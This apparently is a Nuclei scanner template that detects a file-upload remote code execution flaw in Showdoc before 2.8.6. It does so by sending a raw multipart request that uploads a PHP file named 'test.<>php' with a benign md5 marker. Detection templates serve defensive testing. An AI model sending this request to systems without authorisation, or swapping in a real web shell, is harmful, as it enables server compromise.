id: showdoc-file-upload-rce
info:
  name: Showdoc <2.8.6 - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: A vulnerability in Showdoc versions before 2.8.6 allows for remote
    code execution through file uploads (showdoc-file-upload-rce).
  reference:
  - https://github.com/star7th/showdoc/pull/1059
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: rce,fileupload,showdoc,oss,intrusive
  metadata:
    impact: The vulnerability known as showdoc-file-upload-rce can have a significant
      impact on the security of systems running Showdoc versions before 2.8.6, as
      it allows for remote code execution.
    recommendation: I highly recommend updating Showdoc to version 2.8.6 or later
      to prevent any potential remote code execution vulnerabilities.
requests:
- raw:
  - 'POST /index.php?s=/home/page/uploadImg HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633


    ----------------------------835846770881083140190633

    Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"

    Content-Type: text/plain


    <?php echo md5(''rce_test'');?>

    ----------------------------835846770881083140190633--

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"url":"http:'
    - '"success":1'
    condition: and
  - type: status
    status:
    - 200
  extractors:
  - type: json
    json:
    - .url
